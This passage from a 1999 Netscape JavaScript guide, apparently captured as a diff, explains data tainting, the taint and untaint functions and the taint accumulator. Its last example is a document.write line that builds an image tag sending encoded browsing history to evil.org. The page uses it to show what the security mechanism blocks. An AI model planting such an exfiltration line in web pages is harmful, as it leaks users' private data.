+<CODE>hash</CODE>, <CODE>host</CODE>, <CODE>hostname</CODE>, <CODE>href</CODE>, <CODE>pathname</CODE>, <CODE>port</CODE>, <CODE>protocol</CODE>, <CODE>search</CODE>, <CODE>toString</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><PRE><A NAME="1020964">Plugin</A></PRE><TD VALIGN=baseline ALIGN=left><P><A NAME="1020966">
+<CODE>name</CODE></A></P>
+<TR><TD VALIGN=baseline ALIGN=left><P><A NAME="1020968">
+<CODE>window</CODE></A></P><TD VALIGN=baseline ALIGN=left><P><A NAME="1020970">
+<CODE>defaultStatus</CODE>, <CODE>name</CODE>, <CODE>status</CODE></A></P>
+
+</TABLE>
+<TABLE>
+<TR><TD>
+</TABLE>
+</A></P>
+<A NAME="1020972">
+You can use tainted data elements any way you want in your script, but if your script attempts to pass a tainted element's value <I>or any data derived from it</I> over the network in any way (for example, via a form submission or URL), a dialog box is displayed so the user can confirm or cancel the operation.</A></P>
+<A NAME="1020973">
+Values derived from tainted data elements are also tainted. If a tainted value is passed to a function, the return value of the function is tainted. If a string is tainted, any substring of the string is also tainted. If a script examines a tainted value in an <CODE>if</CODE>, <CODE>for</CODE>, or <CODE>while</CODE> statement, the script itself accumulates taint.</A></P>
+<A NAME="1020974">
+You can taint and untaint properties, variables, functions, and objects, as described in <A HREF="sec.htm#1020996">"Tainting and Untainting Individual Data Elements" on page&nbsp;242</A>. You cannot untaint another server's properties or data elements.</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1020979">
+ Enabling Tainting
+</A></H3>
+
+<A NAME="1020981">
+To enable data tainting, the end user sets the <CODE>NS_ENABLE_TAINT</CODE> environment variable as follows:</A></P>
+<ul><P><LI><A NAME="1020982">
+On Unix, use the <CODE>setenv</CODE> command in csh.</A></LI>
+<P><LI><A NAME="1020983">
+On Windows, use <CODE>set</CODE> in <CODE>autoexec.bat</CODE> or NT user settings.</A></LI>
+<P><LI><A NAME="1020984">
+On Macintosh, edit the resource with type "Envi" and number 128 in the Netscape application by removing the two ASCII slashes "//" before the <CODE>NS_ENABLE_TAINT</CODE> text at the end of the resource.</A></LI>
+</ul><A NAME="1020985">
+<CODE>NS_ENABLE_TAINT</CODE> can have any value; "1" will do.</A></P>
+<A NAME="1020986">
+If the end user does not enable tainting and a script attempts to access properties of a window on another server, a message is displayed indicating that access is not allowed.</A></P>
+<A NAME="1020987">
+To determine whether tainting is enabled, use the <CODE>taintEnabled</CODE> method. The following code executes <CODE>function1</CODE> if data tainting is enabled; otherwise it executes <CODE>function2</CODE>.</A></P>
+<PRE><A NAME="1020988">if (navigator.taintEnabled()) {<br>&nbsp;&nbsp;&nbsp;function1()<br>}<br>else function2()</A></PRE><A NAME="1020994">
+See <CODE>taintEnabled</CODE> in the <A HREF="http://developer.netscape.com/docs/manuals/js/client/jsref/index.htm" TARGET="_top"><I>Client-Side JavaScript Reference</I></A>.</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1020996">
+ Tainting and Untainting Individual Data Elements
+</A></H3>
+
+<A NAME="1020998">
+You can taint data elements (properties, variables, functions, objects) in your scripts to prevent the returned values from being used inappropriately by other scripts or propagating beyond another script. You might want to remove tainting from a data element so other scripts can read and do anything with it. You cannot untaint another server's data elements.</A></P>
+<A NAME="1020999">
+You control the tainting of data elements with two functions: <CODE>taint</CODE> adds tainting to a data element, and <CODE>untaint</CODE> removes tainting from a data element. These functions each take a single data element as an argument.</A></P>
+<A NAME="1021000">
+For example, the following statement removes taint from a property so that a script can send it to another server:</A></P>
+<PRE><A NAME="1021001">untaintedStat=untaint(window.defaultStatus)<br>// untaintedStat can now be sent in a URL or form post by other scripts</A></PRE><A NAME="1021003">
+Neither <CODE>taint</CODE> nor <CODE>untaint</CODE> modifies its argument; rather, both functions return a marked or unmarked reference to the <CODE>argument</CODE> object, or copy of the primitive type value (number or boolean value). The mark is called a <I>taint code.</I> JavaScript assigns a unique taint code to each server's data elements. Untainted data has the <I>identity</I> (null) taint code.</A></P>
+<A NAME="1021009">
+See <CODE>taint</CODE> and <CODE>untaint</CODE> in the <A HREF="http://developer.netscape.com/docs/manuals/js/client/jsref/index.htm" TARGET="_top"><I>Client-Side JavaScript Reference</I></A>.</A></P>
+
+<H3><A NAME="Head2;"></A>
+<A NAME="1021011">
+ Tainting that Results from Conditional Statements
+</A></H3>
+
+<A NAME="1021013">
+In some cases, control flow rather than data flow carries tainted information. To handle these cases, each window has a <I>taint accumulator.</I> The taint accumulator holds taint tested in the condition portion of <CODE>if</CODE>, <CODE>for</CODE>, and <CODE>while</CODE> statements. The accumulator mixes different taint codes to create new codes that identify the combination of data origins (for example, serverA, serverB, or serverC).</A></P>
+<A NAME="1021014">
+The taint accumulator is reset to identity only if it contains the current document's original taint code. Otherwise, taint accumulates until the document is unloaded. All windows loading documents from the same origin share a taint accumulator.</A></P>
+<A NAME="1021015">
+You can add taint to or remove taint from a window's taint accumulator.</A></P>
+<ul><P><LI><A NAME="1021016">
+To add taint to a window, call <CODE>taint</CODE> with no argument. JavaScript adds the current document's taint code to the accumulator.</A></LI>
+<P><LI><A NAME="1021017">
+To remove taint from a window, call <CODE>untaint</CODE> with no argument. Calling <CODE>untaint</CODE> with no arguments removes taint from the accumulator only if the accumulator holds taint from the current window only; if it holds taint from operations done on data elements from other servers, <CODE>untaint</CODE> will have no effect. Removing taint from the accumulator results in the accumulator having only the identity taint code.</A></LI>
+</ul><A NAME="1021018">
+If a window's taint accumulator holds taint and the script attempts to pass data over the network, the taint codes in the accumulator are checked. Only if the accumulated script taint, the taint code of the targeted server, and the taint code of the data being sent are compatible will the operation proceed. Compatible means that either two taint codes are equal, or at least one is identity (null). If the script, server, and data taints are incompatible, a dialog box is displayed so the user can confirm or cancel the URL load or form post.</A></P>
+<A NAME="1021019">
+Accumulated taint propagates across <CODE>setTimeout</CODE> and into the evaluation of the first argument to <CODE>setTimeout</CODE>. It propagates through <CODE>document.write</CODE> into generated tags, so that a malicious script cannot signal private information such as session history by generating an HTML tag with an implicitly-loaded URL <CODE>SRC</CODE> parameter such as the following:</A></P>
+<PRE><A NAME="1021021">document.write("&lt;IMG SRC=http://evil.org/cgi.bin/fake-img?" +<br>&nbsp;&nbsp;&nbsp;encode(history) + "&gt;")</A></PRE>
+<HR>
+
+<FONT SIZE=-1><A HREF="contents.htm">Table of Contents</A> | <A HREF="advtopic.htm">Previous</A>
+ | <A HREF="partlc.htm">Next</A>
+ | <A HREF="bklast.htm">Index</A>
+</FONT>
+<P ALIGN=right>
+<FONT SIZE=-2><I>Last Updated:  05/27/99  21:21:40</I></FONT>
+<P> <CENTER>Copyright (c) 1999
+<A HREF="http://home.netscape.com/misc/contact_info.html"
+TARGET=_top>Netscape Communications Corporation</A></FONT>
+</CENTER>
+<P>
+</BODY>
+</HTML>
+
+
